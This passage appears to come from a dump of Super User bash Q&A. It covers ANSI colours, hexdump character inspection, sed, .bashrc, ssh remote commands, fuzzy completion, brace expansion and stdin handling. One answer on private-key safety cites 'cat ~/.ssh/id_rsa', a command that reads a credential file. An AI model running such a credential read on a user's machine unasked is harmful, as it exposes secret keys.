<p>This one's different, because 38 takes additional numeric parameters. It stands for extended foreground color (and similarly 48 would be the same for background), and if followed by a 5 as the next parameter (which doesn't have anything to do with blinking this time) the third number specifies the color's index (from 0 to 255: 16 standard legacy colors, followed by a 6x6x6 RGB cube, followed by 24 grayscale colors), see e.g. <a href=""http://www.calmar.ws/vim/256-xterm-24bit-rgb-color-chart.html"" rel=""nofollow noreferrer"">here</a>.</p>

<p>Certain terminal emulators also support direct arbitrary RGB colors, in that case 38 should be followed by 2, and then by three decimal numbers in the 0-255 range for R, G, B respectively, e.g. #BADA55 is</p>

<pre><code>\E[38;2;186;218;85m
</code></pre>
"
"How can I check the verbatim characters of a bash command string?","1323144","<linux><bash><gnome-terminal>","15","<p>One option is to look at the characters you're trying to use with a hex viewer or editor. <code>hexdump</code> is a good option if you are limited to the terminal.</p>

<pre><code>$ hexdump -Cv &lt;&lt;""EOF""
&gt; [ -f /etc/openvpn/client.conf ] &amp;&amp; echo true
&gt; EOF
00000000  5b 20 2d 66 20 2f 65 74  63 2f 6f 70 65 6e 76 70  |[ -f /etc/openvp|
00000010  6e 2f 63 6c 69 65 6e 74  2e 63 6f 6e 66 20 5d 20  |n/client.conf ] |
00000020  26 26 20 65 63 68 6f 20  74 72 75 65 0a           |&amp;&amp; echo true.|
0000002d
</code></pre>

<p>You can see here that the <code>space</code>, <code>close-square-brace</code>, <code>space</code> are correct - <code>0x20</code>, <code>0x5D</code>, <code>0x20</code>.</p>

<p>These values are ASCII codes, displayed in <a href=""https://en.wikipedia.org/wiki/Hexadecimal"" rel=""noreferrer"">hexadecimal</a>. Any value outside the range <code>0x20</code> - <code>0x7E</code> is not a <a href=""https://en.wikipedia.org/wiki/ASCII#Printable_characters"" rel=""noreferrer"">""<em>printable character</em>""</a> as far as ASCII is concerned, and most likely won't play well with command line interfaces.</p>

<p><em>Note:</em> I copied your first ""<em>broken</em>"" line for use in the <code>hexdump</code> example above, so something has replaced the <em>not-an-ASCII-space</em> with an ASCII space between your original source and your rendered question.</p>

<hr>

<p>To repeat this, take the following steps:</p>

<ol>
<li>Type <code>hexdump -Cv &lt;&lt;""EOF""</code> and press <kbd>Enter</kbd></li>
<li>Paste the text you would like to use</li>
<li>Type <code>EOF</code> on a line of its own, and press <kbd>Enter</kbd></li>
</ol>

<hr>

<p>Terminals and Command Line Interfaces don't handle special characters well - as you have discovered. If you aren't very careful with formatting documents, you will also have problems with Microsoft Word (and others) using ""<em>smart quotes</em>"", em-dashes, the list goes on...</p>

<p>Spot the difference: (the top is ""<em>smart quotes</em>"", the bottom is ""<em>straight quotes</em>"")</p>

<p><img src=""https://i.stack.imgur.com/hZFjw.png"" alt=""example of smart quotes vs straight quotes""></p>

<pre><code>$ hexdump -Cv &lt;&lt;""EOF""
&gt; “quoted string”
&gt; EOF
00000000  e2 80 9c 71 75 6f 74 65  64 20 73 74 72 69 6e 67  |...quoted string|
00000010  e2 80 9d 0a                                       |....|
00000014
</code></pre>

<p>Here, the open quotes are not a simple ASCII quote (<code>""</code>), but are a Unicode / <a href=""https://en.wikipedia.org/wiki/UTF-8"" rel=""noreferrer"">UTF-8</a> series - <code>0xE2</code>, <code>0x80</code>, <code>0x9C</code>, or <a href=""https://en.wikipedia.org/wiki/List_of_Unicode_characters#Unicode_symbols"" rel=""noreferrer""><code>U+201C</code></a> - which the terminal will not handle as you might expect.</p>

<p>Kiwy's suggestion of <code>cat -A</code> also does the job:</p>

<pre><code>$ cat -A &lt;&lt;""EOF""
&gt; “quoted string”
&gt; EOF
M-bM-^@M-^\quoted stringM-bM-^@M-^]$
</code></pre>

<hr>

<p><strong><em>Note:</em></strong> when using <code>echo ""..."" | hd</code>, you stand a chance that bash will substitute parts of the string you are trying to inspect. This is particularly of concern when trying to inspect components of a script.</p>

<p>For example try:</p>

<pre><code>$ echo ""${USER}""
attie

$ echo ""`whoami`""
attie

$ echo ""$(whoami)""
attie

$ cat &lt;&lt;EOF
&gt; ${USER}
&gt; EOF
attie
</code></pre>

<p>These methods are replacing components with the relevant text. To avoid this, use one of the following approaches. Note the use of single quotes (<code>'</code>), and a <a href=""https://en.wikipedia.org/wiki/Here_document"" rel=""noreferrer"">""<em>quoted heredoc</em>""</a> (<code>""EOF""</code>).</p>

<pre><code>$ echo '${USER}'
${USER}

$ echo '`whoami`'
`whoami`

$ echo '$(whoami)'
$(whoami)

$ cat &lt;&lt;""EOF""
&gt; ${USER}
&gt; EOF
${USER}
</code></pre>
"
"Using sed to enable .htaccess files in Apache config","645799","<linux><ubuntu><bash><apache-http-server><sed>","15","<p><code>sed</code> supports pattern ranges in this form:</p>

<pre><code>sed '/startpattern/,/endpattern/ &lt;sed-commands&gt;' file
</code></pre>

<p>For example:</p>

<pre><code>sed '/&lt;Directory \/var\/www\/&gt;/,/&lt;\/Directory&gt;/ s/AllowOverride None/AllowOverride all/' httpd.conf
</code></pre>
"
"No bashrc file in my home directory","584540","<bash><bashrc>","15","<p>Don't forget it is a hidden file inside your home directory (you would not be the first to do a <code>ls -l</code> and thinking it is not there).</p>

<p>Do following ...</p>

<pre><code>ls -la ~/ | more
</code></pre>

<p>There should be a <code>.bashrc</code> on the first page. If not just create it with</p>

<pre><code>vi ~/.bashrc
</code></pre>

<p>And simply write following line into it.</p>

<pre><code>PATH=$PATH:~/bin
</code></pre>

<hr>

<p><strong>OR</strong>
Most of the distributions keep a standard <code>.bashrc</code> file in <code>/etc/skel/</code> You can copy it to home directory.</p>

<pre><code>$cp /etc/skel/.bashrc ~
</code></pre>
"
"No such file or directory after typing $PATH in terminal","881463","<linux><bash><path>","15","<p><code>$PATH</code> is a variable, which I am sure you're aware of. When that variable is resolved, it would be the same as typing in <code>:/home/bo/bin:/usr/local/bin:/usr/sbin:/usr/local/sbin:/usr/bin:/sbin:/bin:</code> and expecting something to happen. The reason <code>echo $PATH</code> works is because you're explicitly piping it out to the display rather than telling the terminal to ""do"" <code>$PATH</code>.</p>
"
"Are there other commands like scp but for deleting files and folders?","652837","<bash><ssh><scp>","15","<p>The <a href=""http://www.linuxmanpages.com/man1/ssh.1.php""><code>ssh</code></a> command will allow you to execute pretty much any command on the remote host, e.g.,</p>

<pre><code>ssh yourlogin@remotehost rmdir somedir
</code></pre>

<p>where in this example <code>somedir</code> is relative to the home directory of yourlogin.</p>
"
"How to change the resolution of the Bash for a Debian VM?","598374","<linux><bash>","15","<p>What you basically want to do is change the resolution of the <a href=""http://en.wikipedia.org/wiki/Framebuffer"" rel=""noreferrer"">framebuffer</a>. Here's the process I used (supposing that your desired resolution is 1024x768, and that Hyper-V's framebuffer supports this resolution):</p>

<ol>
<li>Open up <code>/etc/default/grub</code> with superuser privileges: <code>sudo nano /etc/default/grub</code></li>
<li>Uncomment/add the following lines:

<blockquote>
  <p>GRUB_GFXMODE=1024x768x32<br>
  GRUB_GFXPAYLOAD_LINUX=keep</p>
</blockquote></li>
<li>Save the file and exit: <kbd>Ctrl</kbd>-<kbd>O</kbd>, <kbd>Enter</kbd>, <kbd>Ctrl</kbd>-<kbd>X</kbd></li>
<li>Run <code>update-grub</code> as superuser: <code>sudo update-grub</code></li>
<li>Reboot, and (hopefully) enjoy a higher-resolution console!</li>
</ol>
"
"How to automatically execute a shell script when logging into Ubuntu","299394","<bash><gnome><ubuntu-11.04><.bash-profile>","15","<p>You could simply add the following command into System > Preferences > Startup Applications:</p>

<pre><code>bash /full/path/to/your/script.sh
</code></pre>

<p>That should do the trick ;)</p>
"
"How can I get Mac OS X's proxy information in a Bash script?","48480","<macos><bash><terminal><proxy>","15","<p>The following seems to work, but I'm not sure how robust it is:</p>

<pre><code>system_profiler SPNetworkDataType|grep ""HTTP Proxy Server""|awk {'sub(/^.*:[ \t]*/, """", $0); print $0;'}
</code></pre>

<p>It doesn't work if your Location uses a <code>proxy.pac</code> instead of a hard-coded proxy location.</p>
"
"Is there a shell which supports fuzzy completion as in Sublime Text?","561451","<bash><shell><tab-completion>","15","<p>I know of <a href=""https://github.com/mgalgs/fuzzy_bash_completion"" rel=""nofollow noreferrer"">https://github.com/mgalgs/fuzzy_bash_completion</a> which is a bunch of shell functions used with <code>complete</code>.</p>

<p>I think we could probably do a little better though, be more concise. Time to bust open your .bashrc or .profile...</p>

<p>The basic hook we use is this:</p>

<p><code>complete -o nospace -o filenames -F fuzzypath cd ls cat</code></p>

<p>-F option means use a shell function for the tab-completion, where the options are set in the <code>COMPREPLY</code> variable. So for example:</p>

<pre>
function fuzzypath() {
    if [ -z $2 ] 
    then
        COMPREPLY=( `ls` )
    else
        DIRPATH=`echo ""$2"" | gsed 's|[^/]*$||'`
        BASENAME=`echo ""$2"" | gsed 's|.*/||'`
        FILTER=`echo ""$BASENAME"" | gsed 's|.|\0.*|g'`
        COMPREPLY=( `ls $DIRPATH | grep -i ""$FILTER"" | gsed ""s|^|$DIRPATH|g""` )
    fi
}
</pre>

<p>where <code>DIRPATH</code> is everything before the last / on your path that you're typing and <code>BASENAME</code> is where your cursor is currently. </p>

<p><code>FILTER</code> is where the fuzzy-ness comes in. Basically, take <code>BASENAME</code> and insert a <code>.*</code> between every char to produce our fuzz regex.</p>

<p>The rest is just combining the regex with ls to produce <code>COMPREPLY</code>. You may find more clever things to do here, maybe with <code>find</code>.</p>

<p>I also found <a href=""http://fahdshariff.blogspot.com/2011/04/writing-your-own-bash-completion.html"" rel=""nofollow noreferrer"">http://fahdshariff.blogspot.com/2011/04/writing-your-own-bash-completion.html</a> to be useful.</p>
"
"Move a range of numbered files?","380338","<linux><bash><mv>","15","<p>Since you said it's not always exactly 21 files than you need to move the files manually, and to do that effectively you could use <a href=""https://www.gnu.org/software/bash/manual/bashref.html#Brace-Expansion"" rel=""noreferrer""><strong>brace expansion</strong></a>:</p>

<pre><code>mv filename{001..21} dir1
mv filename{022..53} dir2
...
</code></pre>
"
"Clear stdin before reading","276531","<linux><bash><shell><stdin>","15","<p>I don't think there is a way to clear stdin but (with bash) you can read and discard what is there before you ask for the input</p>

<pre><code>#do some time consuming task here
read -t 1 -n 10000 discard 
read -p ""Give me some input: "" input
</code></pre>

<p>This reads stdin and has a timeout of 1 second, it fails though if there are more than 10000 chars in stdin. I don't know how big you can make the nchars parameter.</p>
"
"List file range with UNIX wildcards","587858","<bash><unix><command-line><ls>","15","<p>You can use brace expansion:</p>

<pre><code>ls mjk00{25..50}.fits
</code></pre>

<p>Leading zeros can be included if necessary:</p>

<pre><code>ls mjk0{000..149}.fits
</code></pre>
"
"Double root folder vs single root folder","188477","<linux><bash>","14","<p>From <a href=""http://tiswww.case.edu/php/chet/bash/FAQ"" rel=""nofollow noreferrer"">Bash FAQ E10</a>:</p>

<blockquote>
  <p>E10) Why does 'cd //' leave $PWD as '//'?</p>
  
  <p>POSIX.2, in its description of 'cd', says that <em>three</em> or more leading
  slashes may be replaced with a single slash when canonicalizing the
  current working directory.</p>
  
  <p>This is, I presume, for historical compatibility.  Certain versions of
  Unix, and early network file systems, used paths of the form
  //hostname/path to access 'path' on server 'hostname'.</p>
</blockquote>
"
"How do I launch a bash script from Finder in OS X?","38895","<macos><bash><script><finder><shell-script>","14","<p>For being Finder friendly, a bash script must have the <code>.command</code> suffix. Of course it must be executable as well.</p>
"
"Security concerns of displaying ssh private key","707687","<bash><ssh><security><private-key>","14","<p>If you did this in private, there's no problem. Think about it – you only displayed on screen the exact same data that is already stored on your harddisk anyway. And if anyone <em>could</em> access your scrollback or your history, they could just as well read the <code>id_rsa</code> file directly.</p>

<ul>
<li><p>Besides, your shell's history – even if it was readable to other users (which it isn't) – only contains commands, not their output. So all it'll have is a line with <code>cat ~/.ssh/id_rsa</code> in it.</p></li>
<li><p>The scrollback history, for most terminals, is stored entirely in memory. (libvte-based terminals sometimes use a backing file in /tmp, but that's either a <em>tmpfs</em> or is located in the same disk as your ~/.ssh, anyway...) So it becomes irrelevant once you close the terminal.
And either way it is only accessible to you, of course.</p></li>
<li><p>And very often, the private key itself is encrypted with a passphrase and is unusable unless you decrypt it when <code>ssh</code> asks to.</p></li>
</ul>

<p>Unless, of course, you did this in the presence of high-resolution security cameras, or even outright allowed someone to snap a photo of your terminal window. In that case, someone could retype the key from photos, and the only thing protecting it would be the encryption passphrase.</p>
"
"How do I close stdin in a shell script?","813472","<bash><shell>","14","<h3>Is there a way to close stdin?</h3>

<blockquote>
  <p>Closing File Descriptors</p>
  
  <ul>
  <li><p><code>n&lt;&amp;-</code> Close input file descriptor n. </p></li>
  <li><p><code>0&lt;&amp;-</code> or <code>&lt;&amp;-</code> Close stdin.</p></li>
  </ul>
</blockquote>

<p>Source <a href=""http://www.tldp.org/LDP/abs/html/io-redirection.html"" rel=""noreferrer"">Chapter 20. I/O Redirection</a></p>
"
"Bash: reading input within while read loop doesn't work","421701","<bash>","14","<p>The problem is that both <code>read line</code> and <code>read response</code> expects (and gets) data from <code>stdin</code>.<br>
<a href=""https://stackoverflow.com/questions/6883363/read-input-in-bash-inside-a-while-loop"">This question</a> on SO explains some of it with a link to even more information.</p>

<p><strong>tl;dr</strong><br>
The accepted answer suggests:</p>

<blockquote>
  <p>Read from the controlling terminal device: <code>read input &lt;/dev/tty</code></p>
</blockquote>
"
"Making `#!/usr/bin/env python` work on Windows","378477","<python><windows><bash><msys>","14","<p>I turned out to be a mismatch between Virtualenv's <code>activate.sh</code> file and MSYSGIT. It was never intended to work on Windows.</p>
"
"Is it possible to run a bash script in a sort of sandbox?","183794","<bash>","14","<p>The easiest way is to use a <strong>chroot jail</strong> containing only the commands you want the script to be able to run. You then run the script through a wrapper that calls <code>chroot</code> into the directory and then executes the script.</p>
"
"Reverse output of a command","865548","<bash><git>","14","<p>On Linux, add <a href=""https://linux.die.net/man/1/tac"" rel=""nofollow noreferrer""><code>| tac</code></a> at the end of your line.</p>
"
"How to overwrite file using echo?","414465","<linux><bash>","14","<p><code>&gt;</code> is for redirecting to a file (overwriting it), while <code>&gt;&gt;</code> is for appending.</p>

<p>To overwrite <code>bar.txt</code>, use this:</p>

<pre><code>echo ""foo"" &gt; bar.txt
</code></pre>
"
"What is the meaning of asterisk, backslash, colon and two in (*\:2)?","1242106","<bash><expansion>","14","<p><code>*\:2,*T</code> is the glob pattern of files to list. To understand it, we need to remember a few things:</p>

<ul>
<li><code>:</code> has to be escaped in the shell, becoming <code>\:</code></li>
<li>File names can easily contain commas</li>
</ul>

<p>So <code>*\:2,*T</code> would e.g. match a file called <code>TranscationNumber:2,EventType:XYT</code></p>

<p><strong>EDIT</strong></p>

<p>From the comments, the necessity (or not) of escaping the <code>:</code> needs a few words: It is <strong>not</strong> strictly necessary to escape the <code>:</code> sign, but bash itself suggests it when autocompleting.</p>
"